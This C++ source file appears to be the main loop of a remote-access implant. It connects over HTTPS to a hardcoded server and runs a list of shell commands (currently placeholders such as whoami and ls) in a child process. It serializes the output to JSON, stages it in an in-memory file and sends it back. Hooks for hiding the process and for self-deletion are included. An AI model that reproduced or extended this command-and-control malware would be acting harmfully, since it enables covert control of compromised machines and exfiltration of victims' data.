#include "../headers/utils.h"
#include "../headers/https.h"
#include "../headers/payload.h"
#include "../headers/info.h"
#include "../headers/debug.h"
#include <unistd.h>
#include <fcntl.h>

int main()
{
    Payload payload;
    Https https;

    int result = -1;
    int suicide = -1;
    int fd = -1;

    std::vector<std::string> output;
    std::vector<std::string> commands;
    std::string jsonPayload;
    // establish connection
    result = https.httpsInit(IP);
    if(result < 0) return -1;


    utils::sigterm_handler();
    //payload.hide();

    bool connected = payload.heartbeat(https, 0, 1) == 0;
    if(!connected) return 1;
    while (!utils::received_sigterm()) {
        //commands = payload.recvCMD(https, 1, 1);

        commands = {"pwd", "whoami", "echo 'hello world' >> hello.txt", "ls", "terminate"};
        https.teardown();

        payload.spawnChild(commands, output, &suicide);

        jsonPayload = utils::serializeVectorToJson(output);

        //Ensures the latest payload stored
        if (fd >= 0) close(fd);

        fd = utils::createMFile(TEMP_FILENAME, { jsonPayload });

        connected = payload.heartbeat(https, 0, 1) == 0;

        if (connected && fd >= 0){
            if (payload.sendMemPayload(https, fd, jsonPayload)){
                fd = -1; // sent successfully
            }
        } else{
            utils::writeFile(TEMP_FILENAME, jsonPayload);
            payload.suicide();
            //payload.hibernate();
        }

        if (suicide == 1) payload.suicide();
    }

    if (fd >= 0) utils::writeFile(TEMP_FILENAME, jsonPayload);

    https.teardown();

    return 0;
}
